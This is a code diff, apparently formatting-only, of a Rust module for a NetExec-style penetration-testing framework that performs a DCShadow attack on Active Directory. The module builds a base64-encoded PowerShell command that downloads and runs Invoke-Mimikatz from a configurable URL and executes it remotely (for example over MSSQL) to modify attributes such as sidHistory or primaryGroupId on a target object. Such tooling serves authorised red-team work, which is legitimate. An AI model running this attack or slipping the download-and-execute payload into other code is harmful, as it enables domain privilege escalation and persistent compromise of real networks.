@@ -6,7 +6,7 @@
 
 use anyhow::Result;
 use async_trait::async_trait;
-use nxc_protocols::{NxcSession, NxcProtocol};
+use nxc_protocols::{NxcProtocol, NxcSession};
 
 use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};
 
@@ -42,13 +42,15 @@ impl NxcModule for DcshadowModule {
         vec![
             ModuleOption {
                 name: "TARGET_OBJECT".to_string(),
-                description: "The distinguished name or sAMAccountName of the target object".to_string(),
+                description: "The distinguished name or sAMAccountName of the target object"
+                    .to_string(),
                 required: true,
                 default: None,
             },
             ModuleOption {
                 name: "ATTRIBUTE".to_string(),
-                description: "The AD attribute to modify (e.g., primaryGroupId, sidHistory)".to_string(),
+                description: "The AD attribute to modify (e.g., primaryGroupId, sidHistory)"
+                    .to_string(),
                 required: true,
                 default: None,
             },
@@ -60,7 +62,8 @@ impl NxcModule for DcshadowModule {
             },
             ModuleOption {
                 name: "MIMIKATZ_URL".to_string(),
-                description: "URL to download Invoke-Mimikatz.ps1 (default uses a placeholder)".to_string(),
+                description: "URL to download Invoke-Mimikatz.ps1 (default uses a placeholder)"
+                    .to_string(),
                 required: false,
                 default: Some("http://127.0.0.1/Invoke-Mimikatz.ps1".to_string()),
             },
@@ -72,10 +75,19 @@ impl NxcModule for DcshadowModule {
         session: &mut dyn NxcSession,
         opts: &ModuleOptions,
     ) -> Result<ModuleResult> {
-        let target_object = opts.get("TARGET_OBJECT").ok_or_else(|| anyhow::anyhow!("TARGET_OBJECT option is required"))?;
-        let attribute = opts.get("ATTRIBUTE").ok_or_else(|| anyhow::anyhow!("ATTRIBUTE option is required"))?;
-        let value = opts.get("VALUE").ok_or_else(|| anyhow::anyhow!("VALUE option is required"))?;
-        let mimi_url = opts.get("MIMIKATZ_URL").map(|s| s.as_str()).unwrap_or("http://127.0.0.1/Invoke-Mimikatz.ps1");
+        let target_object = opts
+            .get("TARGET_OBJECT")
+            .ok_or_else(|| anyhow::anyhow!("TARGET_OBJECT option is required"))?;
+        let attribute = opts
+            .get("ATTRIBUTE")
+            .ok_or_else(|| anyhow::anyhow!("ATTRIBUTE option is required"))?;
+        let value = opts
+            .get("VALUE")
+            .ok_or_else(|| anyhow::anyhow!("VALUE option is required"))?;
+        let mimi_url = opts
+            .get("MIMIKATZ_URL")
+            .map(|s| s.as_str())
+            .unwrap_or("http://127.0.0.1/Invoke-Mimikatz.ps1");
 
         // Construct the PowerShell payload to execute Invoke-Mimikatz
         let script = format!(
@@ -96,7 +108,10 @@ try {{
 
         let b64_script = base64::Engine::encode(
             &base64::engine::general_purpose::STANDARD,
-            script.encode_utf16().flat_map(|u| u.to_le_bytes()).collect::<Vec<u8>>(),
+            script
+                .encode_utf16()
+                .flat_map(|u| u.to_le_bytes())
+                .collect::<Vec<u8>>(),
         );
         let cmd = format!("powershell -e {}", b64_script);
 
@@ -118,11 +133,17 @@ try {{
                 let proto = nxc_protocols::mssql::MssqlProtocol::new();
                 proto.execute(session, &cmd).await?
             }
-            _ => return Err(anyhow::anyhow!("Protocol {} does not support execution", session.protocol())),
+            _ => {
+                return Err(anyhow::anyhow!(
+                    "Protocol {} does not support execution",
+                    session.protocol()
+                ))
+            }
         };
 
         let stdout = output.stdout.trim().to_string();
-        let success = stdout.contains("ms-DRSR") || stdout.contains("DCShadow") && !stdout.contains("DEBUG_ERR");
+        let success = stdout.contains("ms-DRSR")
+            || stdout.contains("DCShadow") && !stdout.contains("DEBUG_ERR");
 
         Ok(ModuleResult {
             credentials: vec![],
